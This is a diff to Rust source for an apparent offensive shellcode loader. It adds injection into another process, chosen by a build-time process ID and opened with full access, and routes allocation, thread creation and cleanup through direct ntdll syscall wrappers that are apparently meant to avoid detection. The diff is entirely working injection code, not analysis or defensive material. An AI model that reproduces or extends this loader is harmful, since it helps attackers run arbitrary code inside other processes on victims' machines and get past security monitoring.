@@ -38,14 +38,48 @@ fn get_shell_code() -> Vec<u8> {
 
 #[cfg(all(feature = "inject_self", not(feature = "inject_proc_id"), not(feature = "inject_proc_name")))]
 fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
+    let ntdll = SyscallWrapper::new();
+    let process_handle: HANDLE = -1;
+
+    inner_load(&ntdll, shell_code, process_handle, true)
+}
+
+#[cfg(all(feature = "inject_proc_id", not(feature = "inject_self"), not(feature = "inject_proc_name")))]
+fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
+    use crate::winapi::constants::PROCESS_ALL_ACCESS;
+
+    let ntdll = SyscallWrapper::new();
+    let process_id = String::from(env!("PROCESS_ID")).parse().unwrap();
+    let mut process_handle: HANDLE = 0;
+
+    crate::debug_ok_msg!(format!("Call to NtOpenProcess"));
+    let mut res = ntdll.nt_open_process(&mut process_handle, PROCESS_ALL_ACCESS, process_id);
+    crate::debug_info_msg!(format!("Call to NtOpenProcess : Result = {:#x}", res));
+    if res != STATUS_SUCCESS {
+        return Err(Box::from("Failed to get Process Handle!"));
+    }
+    debug_success_msg!(format!("Process Handle #{} retrieved from process with id {}", process_handle, process_id ));
+
+    inner_load(&ntdll, shell_code, process_handle, true)?;
+
+    crate::debug_ok_msg!(format!("Call to NtClose"));
+    res = ntdll.nt_close(process_handle);
+    crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
+    if res != STATUS_SUCCESS {
+        return Err(Box::from("Failed to close Process Handle!"));
+    }
+    debug_success_msg!(format!("Process Handle closed"));
+
+    Ok(())
+}
+
+
+fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDLE, wait: bool) -> Result<(), Box<dyn Error>> {
 
     use crate::winapi::constants::{MEM_RESERVE, MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS};
 
     let mut size: usize = shell_code.len();
     let mut address: usize = 0;
-    let ntdll = SyscallWrapper::new();
-    let process_handle: HANDLE = -1;
-
 
     crate::debug_ok_msg!(format!("Call to NtAllocateVirtualMemory"));
     let mut res = ntdll.nt_allocate_virtual_memory(process_handle, &mut address,  &mut size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
@@ -91,13 +125,23 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
     }
     debug_success_msg!("Thread executed");
 
-    crate::debug_ok_msg!(format!("Call to NtWaitForSingleObject"));
-    res =  ntdll.nt_wait_for_single_object(thread_handle);
-    crate::debug_info_msg!(format!("Call to NtWaitForSingleObject : Result = {:#x}", res));
-    if res != STATUS_SUCCESS {
-        return Err(Box::from("Failed to wait!"));
+    if wait {
+        crate::debug_ok_msg!(format!("Call to NtWaitForSingleObject"));
+        res =  ntdll.nt_wait_for_single_object(thread_handle);
+        crate::debug_info_msg!(format!("Call to NtWaitForSingleObject : Result = {:#x}", res));
+        if res != STATUS_SUCCESS {
+            return Err(Box::from("Failed to wait!"));
+        }
+        debug_success_msg!("Thread ended");
     }
-    debug_success_msg!("Thread ended");
+
+    crate::debug_ok_msg!(format!("Call to NtClose"));
+    res = ntdll.nt_close(thread_handle);
+    crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
+    if res != STATUS_SUCCESS {
+        return Err(Box::from("Failed to close Thread Handle!"));
+    }
+    debug_success_msg!(format!("Thread Handle closed"));
 
     Ok(())
 }
